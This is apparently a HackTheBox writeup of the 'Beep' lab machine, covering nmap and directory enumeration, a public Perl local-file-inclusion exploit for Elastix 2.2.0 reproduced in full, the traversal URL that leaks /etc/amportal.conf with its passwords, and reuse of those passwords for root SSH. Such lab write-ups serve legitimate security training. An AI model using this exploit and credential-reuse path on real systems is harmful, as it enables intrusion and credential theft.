---
layout: single
title: "Beep - Linux HacktheBox Writeup"
categories:
  - Writeup
tags:
  - Easy
  - Linux
  - HackTheBox
classes:
  - wide
---

Beep is an easy rated box which involves a lot from enumeration. Knowing or learning how to navigate long enumeration results is crucial here. 

**ENUMERATION**

Nmap the IP address and the following results show: 
```
PORT      STATE SERVICE    VERSION                                                                          
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)                                                       
| ssh-hostkey:                                                                                              
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)                                              
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)

25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 

80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/

110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: PIPELINING TOP EXPIRE(NEVER) APOP IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES AUTH-RESP-CODE USER STLS UIDL LOGIN-DELAY(0)

111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            874/udp   status
|_  100024  1            877/tcp   status

143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: RENAME UIDPLUS URLAUTHA0001 ATOMIC X-NETSCAPE UNSELECT LIST-SUBSCRIBED MULTIAPPEND SORT=MODSEQ LITERAL+ CONDSTORE BINARY RIGHTS=kxte Completed STARTTLS ACL CHILDREN LISTEXT ID IMAP4rev1 IMAP4 IDLE QUOTA CATENATE THREAD=ORDEREDSUBJECT NO ANNOTATEMORE SORT NAMESPACE OK MAILBOX-REFERRALS THREAD=REFERENCES

443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2021-09-19T11:49:19+00:00; +8m15s from scanner time.

993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY

995/tcp   open  pop3       Cyrus pop3d

3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

4445/tcp  open  upnotifyp?

10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
``` 
The results are quite abundant here. But what immediately stands out, is Apache running on port 80. Additionally, what could be another way in, is the ssh service on port 22. 

We can check out the https website in our browser. 
It looks like a redirect of port 443. And shows us a login page provided by Elastix. 

''*Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. It has a Web interface and includes capabilities such as a call center software with predictive dialing.*''

PBX stands for 'Private Branch Exchange' and is an internal telephone network for business.

 Since we have a website, we can try and scout for any directories of interest using Dirbuster. 
```
/index.php	    200	2151
/register.php	200	2151
/images	        200	178
/cgi-bin	    403	475
/help	        200	686
/icons	        200	178
/themes	        200	3370
/modules	    200	178
/admin	        302	215
/static	        200	1464
/mailman	    403	475
/mail	        200	336
/config.php	    200	2151
/pipermail	    200	882
/lang	        200 4996
/recordings	    ???	???
```  

After trying out a few of these, we quickly realise that we need credentials to either log in or just plainly have authorisation.

It seems we've enumerated enough for now. With what we have, we can try to find an exploit encompassing Elastix and PBX. 

**FOOTHOLD AND EXPLOITATION**

Using searchsploit, we can look up elastix in the console:
```
$ searchsploit elastix                                                                                1 ⨯
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                     | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                   | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities             | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                          | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                         | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                        | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                    | php/webapps/18650.py
-------------------------------------------------------------------------- ---------------------------------
```  
The results show two very promising exploits: a Remote Code Execution exploit and a Local File Inclusion one. 

Looking at the LFI exploit we see:
```
Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.

Elastix 2.2.0 is vulnerable; other versions may also be affected.
#------------------------------------------------------------------------------------# 
#Elastix is an Open Source Sofware to establish Unified Communications. 
#About this concept, Elastix goal is to incorporate all the communication alternatives,
#available at an enterprise level, into a unique solution.
#------------------------------------------------------------------------------------#
############################################################
# Exploit Title: Elastix 2.2.0 LFI
# Google Dork: :(
# Author: cheki
# Version:Elastix 2.2.0
# Tested on: multiple
# CVE : notyet
# romanc-_-eyes ;) 
# Discovered by romanc-_-eyes
# vendor http://www.elastix.org/

print "\t Elastix 2.2.0 LFI Exploit \n";
print "\t code author cheki   \n";
print "\t 0day Elastix 2.2.0  \n";
print "\t email: anonymous17hacker{}gmail.com \n";

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

use LWP::UserAgent;
print "\n Target: https://ip ";
chomp(my $target=<STDIN>);
$dir="vtigercrm";
$poc="current_language";
$etc="etc";
$jump="../../../../../../../..//";
$test="amportal.conf%00";

$code = LWP::UserAgent->new() or die "inicializacia brauzeris\n";
$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action";
$res = $code->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~ 'This file is part of FreePBX') {
 
print "\n read amportal.conf file : $answer \n\n";
print " successful read\n";
 
}
else { 
print "\n[-] not successful\n";
	}
``` 
Essentially, the exploit works on the fact that there is an LFI in the *vtigercrm/graph.php* directory. And this directory is accessible because of its incapability to filter its user input.
So visiting **https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action**, should allow us to read credentials. AMPortal credentials according to the exploit. 

The output is very messy and hard to read so we can open the page source in another tab instead. 
Here is the result: 
```
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    FreePBX is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

```  
From this file alone, we get multiple passwords. My first instinct is to grab the Admin 'looking' credentials and try them out on various services we have.
We can successfully log into the Elastix and the FreePBX interface. 
When looking through the server status' for FreePBX we see the different services such as Asterisk, MySQL, SSH and the Web Server. These are all open and running, so we could try to access one of them. 

Since we saw the SSH service first on the Nmap scan, let's try it out. 
SSH-ing using the credentials does not work, until I remembered we needed to use a user name. Admin would equate to Root. 

We successfully login as root. 
Now we can find the flags. 
The flags were found in **/home/fanis/user.txt​​** while the root flag was found in **/root/root.txt**.

Success! 